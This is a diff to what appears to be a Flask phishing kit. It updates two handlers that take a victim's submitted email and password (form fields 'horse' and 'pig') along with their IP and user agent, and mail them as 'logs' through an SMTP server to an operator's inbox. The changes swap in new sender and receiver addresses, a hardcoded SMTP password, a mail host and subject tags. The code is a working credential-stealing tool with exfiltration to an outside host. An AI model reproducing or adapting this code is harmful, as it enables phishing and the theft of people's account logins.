@@ -145,12 +145,12 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "onoshijohn@erhawthone.com"
-        receiver_email = "lento@bseng2i.com"
-        password = "1RQoQkJC[l)l"
+        sender_email = "newallbussiness@newupdateishere.com"
+        receiver_email = "gwan12@rfrniso.com"
+        password = "]NkevAZbUe]S"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "DANI l0GS ! 1"
+        message["Subject"] = "NEWWAVE l0GS ! 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -163,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -182,12 +182,12 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "onoshijohn@erhawthone.com"
-        receiver_email = "lento@bseng2i.com"
-        password = "1RQoQkJC[l)l"
+        sender_email = "newallbussiness@newupdateishere.com"
+        receiver_email = "gwan12@rfrniso.com"
+        password = "]NkevAZbUe]S"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "DANI l0GS !! 2"
+        message["Subject"] = "NEWWAVE l0GS !! 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -200,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
